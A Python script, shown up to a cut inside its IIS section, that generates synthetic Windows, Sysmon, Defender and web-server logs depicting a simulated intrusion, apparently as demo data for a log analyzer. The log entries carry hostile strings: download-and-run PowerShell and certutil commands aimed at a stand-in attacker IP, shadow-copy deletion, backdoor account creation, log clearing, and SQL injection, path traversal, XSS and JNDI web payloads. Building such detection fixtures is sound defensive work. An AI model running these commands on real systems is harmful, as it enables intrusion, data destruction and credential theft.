import json
import random
import re
from datetime import datetime, timedelta, timezone
from pathlib import Path
from xml.sax.saxutils import escape

random.seed(2026)

ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "static" / "demo"
CATALOG = ROOT / "src" / "windowsEventCatalog.ts"

BASE = datetime(2026, 10, 15, 8, 0, 0, tzinfo=timezone.utc)
ATTACKER = "203.0.113.66"
SCANNER = "45.155.205.12"
SPRAY = "198.51.100.23"
GOOD_IPS = [f"198.51.100.{i}" for i in range(40, 60)]

NS = "http://schemas.microsoft.com/win/2004/08/events/event"
SECURITY = ("Microsoft-Windows-Security-Auditing", "{54849625-5478-4994-A5BA-3E3B0328C30D}")
EVENTLOG = ("Microsoft-Windows-Eventlog", "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}")
SYSMON = ("Microsoft-Windows-Sysmon", "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}")
SYSMON_CHANNEL = "Microsoft-Windows-Sysmon/Operational"
DEFENDER = ("Microsoft-Windows-Windows Defender", "{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}")
DEFENDER_CHANNEL = "Microsoft-Windows-Windows Defender/Operational"
AUDIT_SUCCESS = "0x8020000000000000"
AUDIT_FAILURE = "0x8010000000000000"
DOMAIN = "CORP"
DOMAIN_SID = "S-1-5-21-3623811015-3361044348-30300820"
DC = "DC01.corp.local"
FAILURE_IDS = {"4625", "4771", "4776", "5157", "4673", "4825"}


def read_catalog() -> list[tuple[str, str, str]]:
    pattern = re.compile(r'^\s+"(\d{4})": \{ description: "([^"]+)", category: "([A-Z_]+)"', re.M)
    return pattern.findall(CATALOG.read_text(encoding="utf-8"))


def subject(user: str = "alice", rid: int = 1104) -> dict:
    return {
        "SubjectUserSid": f"{DOMAIN_SID}-{rid}",
        "SubjectUserName": user,
        "SubjectDomainName": DOMAIN,
        "SubjectLogonId": f"0x{random.randint(0x100000, 0xffffff):x}",
    }


def logon_fields(user: str, logon_type: str, ip: str) -> dict:
    return {
        "TargetUserSid": f"{DOMAIN_SID}-1104",
        "TargetUserName": user,
        "TargetDomainName": DOMAIN,
        "LogonType": logon_type,
        "LogonProcessName": "User32" if logon_type in ("2", "10") else "NtLmSsp",
        "AuthenticationPackageName": "Negotiate",
        "WorkstationName": "WS-ALICE",
        "IpAddress": ip,
        "IpPort": str(random.randint(49152, 65000)),
    }


def windows_data(event_id: str, category: str) -> dict:
    data = subject()

    if event_id == "4625":
        data.update(logon_fields("alice", "3", "10.0.0.21"))
        data.update({"Status": "0xc000006d", "SubStatus": "0xc000006a", "FailureReason": "%%2313"})
    elif event_id in ("4624", "4634", "4647", "4648", "4778", "4779", "4800", "4801", "4825", "4964"):
        data.update(logon_fields("alice", "10" if event_id in ("4778", "4779", "4825") else "2", "10.0.0.21"))
        if event_id == "4648":
            data.update({"TargetServerName": "FS01.corp.local", "ProcessName": "C:\\Windows\\System32\\runas.exe"})
    elif event_id == "4672":
        data["PrivilegeList"] = "SeDebugPrivilege SeBackupPrivilege SeTakeOwnershipPrivilege SeImpersonatePrivilege"
    elif category == "AUTHENTICATION":
        data = {
            "TargetUserName": "alice",
            "TargetDomainName": DOMAIN,
            "ServiceName": "krbtgt" if event_id in ("4768", "4771") else "cifs/FS01.corp.local",
            "IpAddress": "::ffff:10.0.0.21",
            "Status": "0x18" if event_id == "4771" else "0x0",
            "TicketEncryptionType": "0x17" if event_id == "4769" else "0x12",
            "PreAuthType": "2",
        }
        if event_id == "4776":
            data = {"PackageName": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0", "TargetUserName": "alice", "Workstation": "WS-ALICE", "Status": "0xc000006a"}
    elif category == "ACCOUNT":
        data.update({"TargetUserName": "temp_admin" if event_id not in ("4741", "4742", "4743") else "NEWPC$", "TargetDomainName": DOMAIN, "TargetSid": f"{DOMAIN_SID}-1300"})
        if event_id == "4781":
            data.update({"OldTargetUserName": "temp_admin", "NewTargetUserName": "svc_backup2"})
        if event_id == "4740":
            data.update({"TargetUserName": "bob", "CallerComputerName": "WS-BOB"})
    elif category == "GROUP":
        data.update({"MemberName": "CN=temp_admin,CN=Users,DC=corp,DC=local", "MemberSid": f"{DOMAIN_SID}-1300", "TargetUserName": "Domain Admins", "TargetDomainName": DOMAIN, "TargetSid": f"{DOMAIN_SID}-512"})
    elif category == "PROCESS":
        data.update({"NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessName": "C:\\Windows\\explorer.exe", "ParentProcessName": "C:\\Windows\\explorer.exe", "CommandLine": "powershell.exe -NoProfile -EncodedCommand SQBFAFgA", "TokenElevationType": "%%1937", "ProcessId": "0x1a2c"})
    elif category == "SERVICE":
        data.update({"ServiceName": "UpdaterSvc", "ServiceFileName": "C:\\Users\\Public\\upd.exe", "ServiceType": "0x10", "ServiceStartType": "2", "ServiceAccount": "LocalSystem"})
    elif category == "SCHEDULED_TASK":
        data.update({"TaskName": "\\Microsoft\\Windows\\UpdateCheck", "TaskContent": "<Exec><Command>C:\\Users\\Public\\upd.exe</Command></Exec>"})
    elif category == "AUDIT_POLICY":
        data.update({"CategoryId": "%%8272", "SubcategoryId": "%%12544", "SubcategoryGuid": "{0cce9215-69ae-11d9-bed3-505054503030}", "AuditPolicyChanges": "%%8448, %%8450"})
    elif category == "PRIVILEGE_USE":
        data.update({"ObjectServer": "Security", "Service": "-", "PrivilegeList": "SeDebugPrivilege", "ProcessName": "C:\\Tools\\procdump64.exe"})
    elif category == "OBJECT_ACCESS":
        data.update({"ObjectServer": "Security", "ObjectType": "File", "ObjectName": "C:\\Finance\\salaries.xlsx", "AccessMask": "0x10000", "AccessList": "%%1537", "ProcessName": "C:\\Windows\\explorer.exe"})
        if event_id in ("5140", "5145"):
            data.update({"ShareName": "\\\\*\\C$", "ShareLocalPath": "\\??\\C:\\", "RelativeTargetName": "Windows\\Temp\\x.exe", "IpAddress": "10.0.0.24"})
        if event_id == "4657":
            data.update({"ObjectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "ObjectValueName": "Updater", "NewValue": "C:\\Users\\Public\\upd.exe"})
        if event_id in ("4662", "5136"):
            data.update({"ObjectDN": "CN=AdminSDHolder,CN=System,DC=corp,DC=local", "AttributeLDAPDisplayName": "nTSecurityDescriptor", "Properties": "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}"})
    elif category == "NETWORK":
        data.update({"Application": "\\device\\harddiskvolume3\\users\\public\\upd.exe", "Direction": "%%14593", "SourceAddress": "10.0.0.21", "SourcePort": "51544", "DestAddress": ATTACKER, "DestPort": "4444", "Protocol": "6", "RuleName": "Allow Updater", "RuleId": "{A1B2}"})
    elif category == "CREDENTIALS":
        data.update({"TargetName": "Domain:target=TERMSRV/FS01", "Type": "2", "CountOfCredentialsReturned": "3", "KeyName": "Microsoft Connected Devices Platform device certificate"})
    elif category == "SYSTEM":
        if event_id == "4616":
            data.update({"PreviousTime": "2026-10-15T08:00:00.000Z", "NewTime": "2026-10-14T08:00:00.000Z", "ProcessName": "C:\\Windows\\System32\\cmd.exe"})
        if event_id == "6416":
            data.update({"DeviceDescription": "USB Mass Storage Device", "DeviceId": "USB\\VID_0781&PID_5581\\4C530001"})

    return data


def render_windows(index: int, time: datetime, event_id: str, data: dict, provider=SECURITY, user_data: str | None = None) -> str:
    keywords = "0x8000000000000000" if provider in (SYSMON, DEFENDER) else AUDIT_FAILURE if event_id in FAILURE_IDS else AUDIT_SUCCESS
    channel = SYSMON_CHANNEL if provider is SYSMON else DEFENDER_CHANNEL if provider is DEFENDER else "Security"
    timestamp = time.strftime("%Y-%m-%dT%H:%M:%S.") + f"{index:07d}Z"

    if user_data is not None:
        body = f"<UserData>{user_data}</UserData>"
    else:
        fields = "".join(f'<Data Name="{name}">{escape(str(value))}</Data>' for name, value in data.items())
        body = f"<EventData>{fields}</EventData>"

    return (
        f'<Event xmlns="{NS}"><System>'
        f'<Provider Name="{provider[0]}" Guid="{provider[1]}"/>'
        f"<EventID>{event_id}</EventID><Version>0</Version><Level>{'4' if provider is not SECURITY else '0'}</Level>"
        f"<Task>12544</Task><Opcode>0</Opcode><Keywords>{keywords}</Keywords>"
        f'<TimeCreated SystemTime="{timestamp}"/><EventRecordID>{500000 + index}</EventRecordID>'
        f'<Correlation/><Execution ProcessID="784" ThreadID="{800 + index}"/>'
        f"<Channel>{channel}</Channel><Computer>{DC if provider not in (SYSMON, DEFENDER) else 'WS-ALICE.corp.local'}</Computer><Security/></System>"
        f"{body}</Event>"
    )


SYSMON_ALICE = "CORP\\alice"


def sysmon_process(image: str, command: str, parent: str, parent_command: str = "C:\\Windows\\explorer.exe", integrity: str = "Medium") -> dict:
    return {
        "RuleName": "-", "ProcessGuid": "{7a1b2c3d-0001-6710-1a00-000000001000}", "ProcessId": str(random.randint(1000, 9000)),
        "Image": image, "FileVersion": "10.0.19041.1", "Description": image.split("\\")[-1], "CommandLine": command,
        "CurrentDirectory": "C:\\Users\\alice\\", "User": SYSMON_ALICE, "LogonId": "0x3e7a1", "IntegrityLevel": integrity,
        "Hashes": "SHA256=" + "".join(random.choice("0123456789ABCDEF") for _ in range(64)),
        "ParentProcessGuid": "{7a1b2c3d-0001-6710-0f00-000000000f00}", "ParentProcessId": str(random.randint(500, 999)),
        "ParentImage": parent, "ParentCommandLine": parent_command, "ParentUser": SYSMON_ALICE,
    }


def sysmon_events() -> list[tuple[str, dict]]:
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    events = [
        ("4", {"UtcTime": "2026-10-15 09:00:00.000", "State": "Started", "Version": "15.15", "SchemaVersion": "4.90"}),
        ("16", {"UtcTime": "2026-10-15 09:00:01.000", "Configuration": "C:\\Sysmon\\sysmonconfig.xml", "ConfigurationFileHash": "SHA256=AB12"}),
        ("1", sysmon_process("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "\"chrome.exe\" https://mail.example.com", "C:\\Windows\\explorer.exe")),
        ("1", sysmon_process("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami /all", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "\"WINWORD.EXE\" /n invoice.docm")),
        ("1", sysmon_process(ps, "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=", "C:\\Windows\\System32\\cmd.exe")),
        ("1", sysmon_process(ps, "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.66/a.ps1')", "C:\\Windows\\System32\\cmd.exe")),
        ("1", sysmon_process("C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://203.0.113.66/upd.exe C:\\Users\\Public\\upd.exe", "C:\\Windows\\System32\\cmd.exe")),
        ("1", sysmon_process("C:\\Users\\Public\\upd.exe", "C:\\Users\\Public\\upd.exe -connect", "C:\\Windows\\System32\\cmd.exe")),
        ("1", sysmon_process("C:\\Windows\\System32\\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "C:\\Users\\Public\\upd.exe", integrity="High")),
        ("1", sysmon_process("C:\\Windows\\System32\\net.exe", "net user backdoor P@ssw0rd! /add", "C:\\Windows\\System32\\cmd.exe", integrity="High")),
        ("1", sysmon_process("C:\\Windows\\System32\\wevtutil.exe", "wevtutil.exe cl Security", "C:\\Windows\\System32\\cmd.exe", integrity="High")),
        ("2", {"Image": "C:\\Users\\Public\\upd.exe", "TargetFilename": "C:\\Users\\Public\\upd.exe", "CreationUtcTime": "2019-01-01 00:00:00.000", "PreviousCreationUtcTime": "2026-10-15 09:05:00.000", "User": SYSMON_ALICE}),
        ("3", {"Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "User": SYSMON_ALICE, "Protocol": "tcp", "Initiated": "true", "SourceIp": "10.0.0.21", "SourcePort": "52100", "DestinationIp": "93.184.216.34", "DestinationHostname": "example.com", "DestinationPort": "443", "DestinationPortName": "https"}),
        ("3", {"Image": "C:\\Users\\Public\\upd.exe", "User": SYSMON_ALICE, "Protocol": "tcp", "Initiated": "true", "SourceIp": "10.0.0.21", "SourcePort": "52101", "DestinationIp": "203.0.113.66", "DestinationPort": "4444"}),
        ("3", {"Image": ps, "User": SYSMON_ALICE, "Protocol": "tcp", "Initiated": "true", "SourceIp": "10.0.0.21", "SourcePort": "52102", "DestinationIp": "203.0.113.66", "DestinationPort": "80"}),
        ("5", {"Image": "C:\\Windows\\System32\\cmd.exe", "ProcessId": "4242", "User": SYSMON_ALICE}),
        ("6", {"ImageLoaded": "C:\\Windows\\System32\\drivers\\rtcore64.sys", "Hashes": "SHA256=01AA", "Signed": "false", "Signature": "", "SignatureStatus": "Unavailable"}),
        ("7", {"Image": "C:\\Users\\Public\\upd.exe", "ImageLoaded": "C:\\Windows\\System32\\samlib.dll", "Signed": "true", "Signature": "Microsoft Windows", "SignatureStatus": "Valid", "User": SYSMON_ALICE}),
        ("8", {"SourceImage": "C:\\Users\\Public\\upd.exe", "TargetImage": "C:\\Windows\\explorer.exe", "NewThreadId": "6120", "StartAddress": "0x00007FF6A1B20000", "StartFunction": "-", "SourceUser": SYSMON_ALICE, "TargetUser": SYSMON_ALICE}),
        ("9", {"Image": "C:\\Users\\Public\\upd.exe", "Device": "\\Device\\HarddiskVolume3", "User": SYSMON_ALICE}),
        ("10", {"SourceImage": "C:\\Users\\Public\\upd.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4", "SourceUser": SYSMON_ALICE, "TargetUser": "NT AUTHORITY\\SYSTEM"}),
        ("10", {"SourceImage": "C:\\Windows\\System32\\svchost.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1000", "SourceUser": "NT AUTHORITY\\SYSTEM", "TargetUser": "NT AUTHORITY\\SYSTEM"}),
        ("11", {"Image": ps, "TargetFilename": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk", "User": SYSMON_ALICE}),
        ("11", {"Image": "C:\\Windows\\System32\\certutil.exe", "TargetFilename": "C:\\Users\\Public\\upd.exe", "User": SYSMON_ALICE}),
        ("12", {"EventType": "CreateKey", "Image": "C:\\Users\\Public\\upd.exe", "TargetObject": "HKU\\S-1-5-21-1\\Software\\Upd", "User": SYSMON_ALICE}),
        ("13", {"EventType": "SetValue", "Image": "C:\\Users\\Public\\upd.exe", "TargetObject": "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "Details": "C:\\Users\\Public\\upd.exe", "User": SYSMON_ALICE}),
        ("14", {"EventType": "RenameKey", "Image": "C:\\Windows\\regedit.exe", "TargetObject": "HKLM\\SOFTWARE\\Vendor\\Old", "NewName": "HKLM\\SOFTWARE\\Vendor\\New", "User": SYSMON_ALICE}),
        ("15", {"Image": "C:\\Users\\Public\\upd.exe", "TargetFilename": "C:\\Users\\Public\\report.txt:hidden.exe", "Hash": "SHA256=33CC", "User": SYSMON_ALICE}),
        ("15", {"Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "TargetFilename": "C:\\Users\\alice\\Downloads\\invoice.docm:Zone.Identifier", "Hash": "SHA256=44DD", "User": SYSMON_ALICE}),
        ("17", {"EventType": "CreatePipe", "Image": "C:\\Users\\Public\\upd.exe", "PipeName": "\\msagent_42", "User": SYSMON_ALICE}),
        ("18", {"EventType": "ConnectPipe", "Image": "C:\\Windows\\System32\\rundll32.exe", "PipeName": "\\msagent_42", "User": SYSMON_ALICE}),
        ("19", {"EventType": "WmiFilterEvent", "Operation": "Created", "User": SYSMON_ALICE, "EventNamespace": "root\\subscription", "Name": "UpdFilter", "Query": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}),
        ("20", {"EventType": "WmiConsumerEvent", "Operation": "Created", "User": SYSMON_ALICE, "Name": "UpdConsumer", "Type": "Command Line", "Destination": "C:\\Users\\Public\\upd.exe"}),
        ("21", {"EventType": "WmiBindingEvent", "Operation": "Created", "User": SYSMON_ALICE, "Consumer": "CommandLineEventConsumer.Name=\"UpdConsumer\"", "Filter": "__EventFilter.Name=\"UpdFilter\""}),
        ("22", {"Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "QueryName": "mail.example.com", "QueryStatus": "0", "QueryResults": "93.184.216.34;", "User": SYSMON_ALICE}),
        ("22", {"Image": ps, "QueryName": "update-cdn.badc2.example", "QueryStatus": "0", "QueryResults": "203.0.113.66;", "User": SYSMON_ALICE}),
        ("22", {"Image": "C:\\Users\\Public\\upd.exe", "QueryName": "6a6f686e2e646f65407061737377307264212d65786669.data.badc2.example", "QueryStatus": "0", "QueryResults": "-", "User": SYSMON_ALICE}),
        ("23", {"Image": "C:\\Users\\Public\\upd.exe", "TargetFilename": "C:\\Users\\alice\\Documents\\budget.xlsx", "Hashes": "SHA256=55EE", "IsExecutable": "false", "Archived": "true", "User": SYSMON_ALICE}),
        ("24", {"Image": "C:\\Windows\\System32\\notepad.exe", "Session": "1", "ClientInfo": "user: alice", "Hashes": "SHA256=66FF", "Archived": "false", "User": SYSMON_ALICE}),
        ("25", {"Image": "C:\\Windows\\System32\\svchost.exe", "Type": "Image is replaced", "User": SYSMON_ALICE}),
        ("26", {"Image": "C:\\Windows\\System32\\cmd.exe", "TargetFilename": "C:\\Users\\Public\\stage1.bat", "Hashes": "SHA256=77AA", "IsExecutable": "false", "User": SYSMON_ALICE}),
        ("27", {"Image": "C:\\Windows\\System32\\certutil.exe", "TargetFilename": "C:\\Users\\alice\\Downloads\\tool.exe", "Hashes": "SHA256=88BB", "User": SYSMON_ALICE}),
        ("28", {"Image": "C:\\Users\\Public\\sdelete.exe", "TargetFilename": "C:\\Users\\alice\\Documents\\notes.txt", "Hashes": "SHA256=99CC", "IsExecutable": "false", "User": SYSMON_ALICE}),
        ("29", {"Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "TargetFilename": "C:\\Users\\alice\\Downloads\\setup.exe", "Hashes": "SHA256=AACC", "User": SYSMON_ALICE}),
        ("4", {"UtcTime": "2026-10-15 09:40:00.000", "State": "Stopped", "Version": "15.15", "SchemaVersion": "4.90"}),
    ]
    return events


def defender_events() -> list[tuple[str, dict]]:
    threat = {
        "Product Name": "Microsoft Defender Antivirus", "Threat ID": "2147735505", "Threat Name": "HackTool:Win32/Mimikatz!pz",
        "Severity Name": "High", "Category Name": "Tool", "Path": "file:_C:\\Users\\alice\\AppData\\Local\\Temp\\m.exe",
        "Detection Origin Name": "Local machine", "Detection User": "CORP\\alice", "Process Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    }
    return [
        ("2000", {"Product Name": "Microsoft Defender Antivirus", "Current Signature Version": "1.419.212.0", "Previous Signature Version": "1.419.180.0"}),
        ("1116", threat),
        ("1117", {**threat, "Action Name": "Quarantine"}),
        ("5007", {"Product Name": "Microsoft Defender Antivirus", "Old Value": "", "New Value": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\ProgramData\\cache = 0x0"}),
        ("5001", {"Product Name": "Microsoft Defender Antivirus"}),
        ("1121", {"Product Name": "Microsoft Defender Antivirus", "ID": "D4F940AB-401B-4EFC-AADC-AD5F3C50688A", "Detection Time": "2026-10-15T09:32:05.000Z",
                  "User": "CORP\\alice", "Path": "C:\\Users\\alice\\Downloads\\payload.exe", "Process Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}),
    ]


def windows_demo() -> str:
    events: list[tuple] = []
    time = BASE

    for minute in range(6):
        data = subject("WS-ALICE$", 1000)
        data.update(logon_fields("SYSTEM", "5", "-"))
        data["TargetUserSid"] = "S-1-5-18"
        events.append((BASE + timedelta(seconds=20 * minute), "4624", data))

    for event_id, _description, category in read_catalog():
        time += timedelta(seconds=37)

        if event_id == "1102":
            cleared = (f'<LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">'
                       f"<SubjectUserSid>{DOMAIN_SID}-500</SubjectUserSid><SubjectUserName>administrator</SubjectUserName>"
                       f"<SubjectDomainName>{DOMAIN}</SubjectDomainName><SubjectLogonId>0x8a4f2</SubjectLogonId></LogFileCleared>")
            events.append((time, event_id, {}, EVENTLOG, cleared))
        elif event_id == "1100":
            events.append((time, event_id, {}, EVENTLOG, '<ServiceShutdown xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog"/>'))
        else:
            events.append((time, event_id, windows_data(event_id, category)))

    for attempt in range(8):
        data = subject("-", 0)
        data["SubjectUserSid"] = "S-1-0-0"
        data.update(logon_fields("administrator", "10", ATTACKER))
        data.update({"Status": "0xc000006d", "SubStatus": "0xc000006a", "FailureReason": "%%2313", "WorkstationName": "kali"})
        events.append((time + timedelta(seconds=5 + attempt * 3), "4625", data))

    for attempt, user in enumerate(["alice", "bob", "carol", "dave", "helpdesk", "svc_sql"]):
        data = subject("-", 0)
        data["SubjectUserSid"] = "S-1-0-0"
        data.update(logon_fields(user, "3", SPRAY))
        data.update({"Status": "0xc000006d", "SubStatus": "0xc000006a", "FailureReason": "%%2313", "WorkstationName": "-"})
        events.append((time + timedelta(minutes=2, seconds=attempt * 4), "4625", data))

    sysmon_start = BASE + timedelta(hours=1)
    for offset, (event_id, data) in enumerate(sysmon_events()):
        events.append((sysmon_start + timedelta(seconds=offset * 20), event_id, data, SYSMON))

    defender_start = BASE + timedelta(hours=1, minutes=30)
    for offset, (event_id, data) in enumerate(defender_events()):
        events.append((defender_start + timedelta(seconds=offset * 25), event_id, data, DEFENDER))

    events.sort(key=lambda item: item[0])
    rows = []

    for index, event in enumerate(events):
        time, event_id, data, *rest = event
        provider = rest[0] if rest else SECURITY
        user_data = rest[1] if len(rest) > 1 else None
        rows.append(render_windows(index, time, event_id, data, provider, user_data))

    return '<?xml version="1.0" encoding="UTF-8"?>\n<Events>\n' + "\n".join(rows) + "\n</Events>\n"


def at(index: int, step: int = 37) -> datetime:
    return BASE + timedelta(seconds=index * step)


def access_demo() -> str:
    normal_paths = ["/", "/index.html", "/about", "/static/app.js", "/static/style.css", "/api/items?page=2", "/login", "/favicon.ico"]
    browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    ]
    attacks = [
        ("GET", "/index.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", "sqlmap/1.8#stable (https://sqlmap.org)"),
        ("GET", "/../../../../etc/passwd", "Mozilla/5.0 zgrab/0.x"),
        ("GET", "/.env", "Mozilla/5.0 (compatible; Nuclei)"),
        ("GET", "/.git/config", "Mozilla/5.0 (compatible; Nuclei)"),
        ("POST", "/wp-login.php", "WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)"),
        ("GET", "/phpmyadmin/index.php", "Mozilla/5.00 (Nikto/2.5.0)"),
        ("GET", "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "Mozilla/5.0"),
        ("GET", "/?x=${jndi:ldap://evil.example/a}", "${jndi:ldap://evil.example/ua}"),
        ("POST", "/cgi-bin/luci;wget%20http://evil.example/x.sh", "Mozilla/5.0"),
        ("GET", "/uploads/shell.php?cmd=id", "python-requests/2.31.0"),
    ]
    lines = []

    for i in range(260):
        offset = at(i).astimezone(timezone(timedelta(hours=3))).strftime("%d/%b/%Y:%H:%M:%S %z")

        if 60 <= i < 90:
            method, path, agent = attacks[i % len(attacks)]
            ip, status = ATTACKER, random.choice(["404", "403", "400", "200"])
        elif 150 <= i < 180:
            method, path, agent = "GET", f"/backup_{i}.zip", "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2)"
            ip, status = SCANNER, "404"
        elif 200 <= i < 210:
            method, path, agent = "POST", "/admin/login", "python-requests/2.31.0"
            ip, status = "203.0.113.77", "401"
        else:
            method, path = random.choice(["GET"] * 6 + ["POST"]), random.choice(normal_paths)
            agent = random.choice(browsers + ["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "curl/8.5.0"])
            ip, status = random.choice(GOOD_IPS), random.choice(["200"] * 12 + ["304", "301", "404", "500", "502"])

        lines.append(f'{ip} - - [{offset}] "{method} {path} HTTP/1.1" {status} {random.randint(200, 9000)} "-" "{agent}"')

    lines.insert(100, f'{ATTACKER} - - [{at(100).strftime("%d/%b/%Y:%H:%M:%S +0000")}] "\\x16\\x03\\x01\\x00\\xa5\\x01" 400 157 "-" "-"')
    lines.insert(120, "this line was cut by logrotate and is broken on purpose")
    return "\n".join(lines) + "\n"


def nginx_error_demo() -> str:
    templates = [
        ("error", 'upstream timed out (110: Connection timed out) while reading response header from upstream, client: {good}, server: example.com, request: "GET /api/report HTTP/1.1", upstream: "http://127.0.0.1:8000/api/report", host: "example.com"'),
        ("error", 'open() "/var/www/html/.env" failed (2: No such file or directory), client: {attacker}, server: example.com, request: "GET /.env HTTP/1.1", host: "example.com"'),
        ("error", 'limiting requests, excess: 10.520 by zone "login", client: {attacker}, server: example.com, request: "POST /login HTTP/1.1", host: "example.com"'),
        ("error", 'access forbidden by rule, client: {scanner}, server: example.com, request: "GET /server-status HTTP/1.1", host: "example.com"'),
        ("error", 'connect() failed (111: Connection refused) while connecting to upstream, client: {good}, server: example.com, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:8000/", host: "example.com"'),
        ("crit", "SSL_do_handshake() failed (SSL: error:0A00006C:SSL routines::bad key share) while SSL handshaking, client: {scanner}, server: 0.0.0.0:443"),
        ("error", 'client intended to send too large body: 104857600 bytes, client: {good}, server: example.com, request: "POST /upload HTTP/1.1", host: "example.com"'),
        ("warn", 'an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: {good}, server: example.com, request: "GET /download HTTP/1.1", host: "example.com"'),
        ("alert", "worker process 1207 exited on signal 11 (core dumped)"),
        ("emerg", 'unknown directive "proxy_pas" in /etc/nginx/sites-enabled/example.conf:12'),
        ("error", 'open() "/var/www/html/wp-login.php" failed (2: No such file or directory), client: {attacker}, server: example.com, request: "GET /wp-login.php?x=../../etc/passwd HTTP/1.1", host: "example.com"'),
    ]
    lines = [f'{BASE.strftime("%Y/%m/%d %H:%M:%S")} [notice] 1200#1200: signal process started']

    for i in range(88):
        level, text = templates[i % len(templates)]
        stamp = (BASE + timedelta(seconds=60 + i * 90)).strftime("%Y/%m/%d %H:%M:%S")
        text = text.format(good=random.choice(GOOD_IPS), attacker=ATTACKER, scanner=SCANNER)
        lines.append(f"{stamp} [{level}] 1207#1207: *{100 + i} {text}")

    return "\n".join(lines) + "\n"


def apache_error_demo() -> str:
    templates = [
        "[core:error] [pid 2211:tid 140031] [client {attacker}:51234] AH00126: Invalid URI in request GET /../../../../etc/passwd HTTP/1.1",
        "[authz_core:error] [pid 2211:tid 140032] [client {attacker}:51240] AH01630: client denied by server configuration: /var/www/html/server-status",
        '[:error] [pid 2212:tid 140033] [client {scanner}:40022] [client {scanner}] ModSecurity: Access denied with code 403 (phase 2). detected SQLi using libinjection. [file "/etc/modsecurity/crs/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "65"] [id "942100"] [msg "SQL Injection Attack Detected via libinjection"] [severity "CRITICAL"] [hostname "example.com"] [uri "/products.php"] [unique_id "ZxAbCd"]',
        "[php:error] [pid 2213:tid 140034] [client {good}:5000] PHP Fatal error:  Uncaught Error: Call to undefined function mysql_connect() in /var/www/html/db.php:12",
        "[proxy:error] [pid 2214:tid 140035] (111)Connection refused: AH00957: http: attempt to connect to 127.0.0.1:8080 (127.0.0.1) failed",
        "[auth_basic:error] [pid 2215:tid 140036] [client {attacker}:51300] AH01618: user admin not found: /admin",
        "[ssl:warn] [pid 2216:tid 140037] AH01909: example.com:443:0 server certificate does NOT include an ID which matches the server name",
        "[mpm_event:notice] [pid 2200:tid 140001] AH00489: Apache/2.4.58 (Ubuntu) configured -- resuming normal operations",
    ]
    lines = ["[Thu Oct 15 08:00:30 2026] [error] [client 198.51.100.41] File does not exist: /var/www/html/favicon.ico"]

    for i in range(64):
        moment = BASE + timedelta(seconds=60 + i * 120)
        stamp = moment.strftime("%a %b %d %H:%M:%S.") + f"{random.randint(0, 999999):06d}" + moment.strftime(" %Y")
        text = templates[i % len(templates)].format(good=random.choice(GOOD_IPS), attacker=ATTACKER, scanner=SCANNER)
        lines.append(f"[{stamp}] {text}")

        if i == 3:
            lines.append("PHP Stack trace:")
            lines.append("  #0 {main}")

    return "\n".join(lines) + "\n"


def iis_demo() -> str:
    lines = [
        "#Software: Microsoft Internet Information Services 10.0",
        "#Version: 1.0",
        "#Date: 2026-10-15 08:00:00",
        "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken",
    ]

    for i in range(160):
        moment = at(i, 45)
        day, clock = moment.strftime("%Y-%m-%d"), moment.strftime("%H:%M:%S")

        if 40 <= i < 70:
            lines.append(f"{day} {clock} 10.0.0.5 POST /owa/auth.owa - 443 - {ATTACKER} Mozilla/5.0+(Windows+NT+10.0) - 401 1 1326 120")
        elif 100 <= i < 108:
